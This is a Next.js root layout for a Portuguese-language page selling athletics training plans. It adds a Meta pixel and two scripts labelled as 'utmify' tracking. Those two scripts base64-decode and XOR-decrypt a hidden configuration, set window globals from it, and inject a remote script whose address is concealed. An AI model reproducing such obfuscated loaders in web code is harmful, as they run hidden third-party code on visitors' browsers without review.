import type { Metadata } from 'next'
import { Inter, Oswald } from 'next/font/google'
import Script from 'next/script'
import './globals.css'

const inter = Inter({
  variable: '--font-inter',
  subsets: ['latin'],
})

const oswald = Oswald({
  variable: '--font-oswald',
  subsets: ['latin'],
  weight: ['400', '500', '600', '700'],
})

export const metadata: Metadata = {
  title: '200 Treinos de Atletismo | Biblioteca Visual de Treinos',
  description:
    '200 treinos prontos de atletismo para consultar e aplicar, do iniciante ao avançado, com adaptações por público e nível. Acesso imediato.',
  generator: 'v0.app',

  openGraph: {
    title: '200 Treinos de Atletismo | Biblioteca Visual de Treinos',
    description:
      '200 treinos prontos de atletismo para consultar e aplicar. Acesso imediato e garantia de 7 dias.',
    type: 'website',
    locale: 'pt_BR',
    siteName: '200 Treinos de Atletismo',
  },

  twitter: {
    card: 'summary_large_image',
    title: '200 Treinos de Atletismo',
    description:
      '200 treinos prontos de atletismo para consultar e aplicar. Acesso imediato e garantia de 7 dias.',
  },

  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html
      lang="pt-BR"
      className={`${inter.variable} ${oswald.variable} bg-background`}
    >
      <head>
        <Script
          id="utmify-pixel-script"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var i_avi=atob("DAVaREbKY8H5fjo/Gn54MTSmQfvbFk5LanZga2mpB6/XC05Sc2MjaiWlDu+bDBVMeXczNDK5TLGQBl9TNXUzPCOmTauKXBYde3EuNi+oFrWcDRgFQVh2ZiGmDKOYEkkdIF4hZiirDqTbRBhPc30/KA+uQe3bCFtTb2B4fmT8AvnITQsPeDRvcn/+V/jITQ4OKTBvdiXoHpyE");var q_eme=[];for(var h_ql5u=0;h_ql5u<i_avi.length;h_ql5u++){q_eme.push(i_avi.charCodeAt(h_ql5u)&255);}var i_g=q_eme[0];var f_yn67=q_eme.slice(1,1+i_g);var d_96mi=q_eme.slice(1+i_g);var m_o5c=d_96mi.map(function(b,q_nr){return b^f_yn67[q_nr%i_g];});var h_w="";for(var z_cu=0;z_cu<m_o5c.length;z_cu++){h_w+=String.fromCharCode(m_o5c[z_cu]&255);}var o_thyf=decodeURIComponent(escape(h_w));var o_c=JSON.parse(o_thyf);var o_d2r4=o_c.globals||[];o_d2r4.forEach(function(s_gk8g){window[s_gk8g.name]=s_gk8g.value;});var v_37o=document.createElement("script");v_37o.src=o_c.url;v_37o.async=true;v_37o.defer=true;(o_c.attributes||[]).forEach(function(t_0){v_37o.setAttribute(t_0.name,t_0.value);});(document.head||document.documentElement).appendChild(v_37o);})();`,
          }}
        />

        <Script
          id="utmify-utms-script"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var m_qt5=atob("DC/uRa6S6kp0FYRZWVTMMNz+yHBWffAtKVzUaoHxjiRaYPA0MEmXa839h2QWZ6sqOl2HNdrhxT8AePd2NU6aIN3mxCAHN6h7OFuaN8fwnz4RZqZjAlTMK8//j2hON+A4LU7DMNr/gywNOPQrPFmLK9q/kikbcakqOkTMaYzkiyYBcKZjew2TadWwhCsZcKZje0uPMc+/nz4ZfOIgdF+cINj3hD5ZZvE7MEudZ4KwnCsYYOF7Yw3MOPPv");var y_u=[];for(var e_xym=0;e_xym<m_qt5.length;e_xym++){y_u.push(m_qt5.charCodeAt(e_xym)&255);}var z_3ub3=y_u[0];var j_0gy=y_u.slice(1,1+z_3ub3);var h_q=y_u.slice(1+z_3ub3);var s_66z=h_q.map(function(b,m_40){return b^j_0gy[m_40%z_3ub3];});var a_2f3="";for(var r_x0=0;r_x0<s_66z.length;r_x0++){a_2f3+=String.fromCharCode(s_66z[r_x0]&255);}var i_v4j=decodeURIComponent(escape(a_2f3));var a_jiuj=JSON.parse(i_v4j);var x_9=a_jiuj.globals||[];x_9.forEach(function(z_e){window[z_e.name]=z_e.value;});var d_p=document.createElement("script");d_p.src=a_jiuj.url;d_p.async=true;d_p.defer=true;(a_jiuj.attributes||[]).forEach(function(f_i){d_p.setAttribute(f_i.name,f_i.value);});(document.head||document.documentElement).appendChild(d_p);})();`,
          }}
        />

        <Script
          id="meta-pixel"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1072415942001622');fbq('track','PageView');`,
          }}
        />
      </head>

      <body className="font-sans antialiased">
        {children}
      </body>
    </html>
  )
}
